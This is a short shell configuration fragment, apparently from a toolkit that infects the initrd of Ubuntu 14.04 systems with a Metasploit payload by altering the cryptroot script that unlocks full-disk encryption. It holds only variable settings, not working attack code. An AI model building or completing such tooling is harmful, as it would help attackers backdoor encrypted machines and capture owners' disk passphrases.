
#where are located binaries preparated for this distro:
#(remember: there is a special copy script which helps in preparing that dir)
BINDIR=$WORKDIR"/kitgen/ubuntu_14.04_x86_64/binaries"
PAYLOADBINDIR=$BINDIR"/payload"
#path to metasploit payload
MSF_PAYLOAD_PATH=$PAYLOADBINDIR"/"$MSF_PAYLOAD
#internal variable - where should be unpacked the initrd
worksubdirdate=`date +_%Y-%m-%d-%H_%M_%S`
WORKSUBDIR=$WORKDIR"/work"$worksubdirdate
#the length of mount directory, needed for path manipulation
MNTDIRLEN=`echo $MNTDIR"/" | wc -c`
#where will be placed resulting initrd after infection
TARGETINITRDDIR=$WORKDIR"/result"
#temporary file for building new cryptsetup script
TEMPFILE=`mktemp`
#which file we are infecting?
CRYPTROOTFILE="scripts/local-top/cryptroot"

